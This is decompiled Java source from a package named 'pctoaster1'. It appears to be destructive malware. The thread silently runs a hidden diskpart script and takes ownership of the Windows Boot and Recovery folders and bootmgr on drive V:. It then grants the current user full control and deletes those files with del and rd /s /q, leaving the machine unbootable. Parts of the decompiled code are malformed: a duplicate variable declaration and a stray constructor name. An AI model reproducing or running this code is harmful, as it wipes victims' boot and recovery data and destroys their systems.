package pctoaster1;

import java.io.File;
import java.util.HashSet;
import java.util.Iterator;

// Referenced classes of package pctoaster1:
//            a

class t
    implements Runnable
{

    public void run()
    {
        try
        {
            files.clear();
            File f = new File(a.ExportResource("/scr.txt"));
            comimp((new StringBuilder("attrib +h ")).append(f.getPath()).toString());
            comimp((new StringBuilder("diskpart /s ")).append(f.getAbsolutePath()).toString());
            comimp("takeown /f V:\\Boot /r");
            comimp("takeown /f V:\\Recovery /r");
            collectFiles(new File("V:\\Boot"));
            collectFiles(new File("V:\\Recovery"));
            files.add(new File("V:\\bootmgr"));
            String ow = System.getProperty("user.name");
            File file;
            for(Iterator iterator = files.iterator(); iterator.hasNext(); com((new StringBuilder("rd /s /q ")).append(file.getPath()).toString()))
            {
                file = (File)iterator.next();
                comimp((new StringBuilder("takeown /f ")).append(file.getPath()).toString());
                comimp((new StringBuilder("icacls ")).append(file.getPath()).append(" /grant \"").append(ow).append("\":F").toString());
                com((new StringBuilder("del ")).append(file.getPath()).toString());
                file.delete();
            }

            File file;
            for(Iterator iterator1 = files.iterator(); iterator1.hasNext(); comimp((new StringBuilder("rd /s /q ")).append(file.getPath()).toString()))
            {
                file = (File)iterator1.next();
                comimp((new StringBuilder("takeown /f ")).append(file.getPath()).toString());
                comimp((new StringBuilder("icacls ")).append(file.getPath()).append(" /grant \"").append(ow).append("\":F").toString());
                comimp((new StringBuilder("del ")).append(file.getPath()).toString());
                file.delete();
            }

        }
        catch(Exception ex)
        {
            ex.printStackTrace();
        }
    }

    final a this$0;

    tion()
    {
        this$0 = a.this;
        super();
    }
}
